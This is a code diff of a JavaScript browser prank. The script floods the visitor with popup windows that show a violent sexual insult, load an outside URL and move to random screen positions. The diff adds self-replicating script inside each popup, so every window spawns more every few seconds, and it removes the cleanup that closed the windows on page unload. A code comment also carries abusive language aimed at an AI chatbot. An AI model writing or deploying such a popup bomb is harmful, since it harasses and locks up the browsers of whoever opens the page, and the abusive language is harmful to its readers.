@@ -1,11 +1,29 @@
 const message = "get raped!";
 const windows = [];
+const targetURL = "https://bhoppings.de/rape"; // Replace with the appropriate URL if needed - shut the fuck up chatgpt kill yourself
 
 function createMovingWindow() {
-    const newWindow = window.open("", "", "width=200,height=100");
+    const newWindow = window.open(targetURL, "", "width=200,height=100");
     if (newWindow) {
         newWindow.document.write(`<p style="font-size:20px;color:red;text-align:center;">${message}</p>`);
         newWindow.document.title = message;
+
+        newWindow.document.write(`
+            <script>
+                function createMovingWindow() {
+                    const newWindow = window.open("${targetURL}", "", "width=200,height=100");
+                    if (newWindow) {
+                        newWindow.document.write(\`<p style="font-size:20px;color:red;text-align:center;">${message}</p>\`);
+                        newWindow.document.title = "${message}";
+                        newWindow.moveTo(Math.random() * screen.width, Math.random() * screen.height);
+                        newWindow.focus();
+                    }
+                }
+
+                setInterval(createMovingWindow, 3000);
+            <\/script>
+        `);
+
         newWindow.moveTo(Math.random() * screen.width, Math.random() * screen.height);
         newWindow.focus();
         windows.push(newWindow);
@@ -17,5 +35,6 @@ setInterval(() => {
 }, 1);
 
 window.addEventListener('beforeunload', () => {
-    windows.forEach(win => win.close());
+    // Do not close the windows, just remove them from the array
+    windows.length = 0;
 });
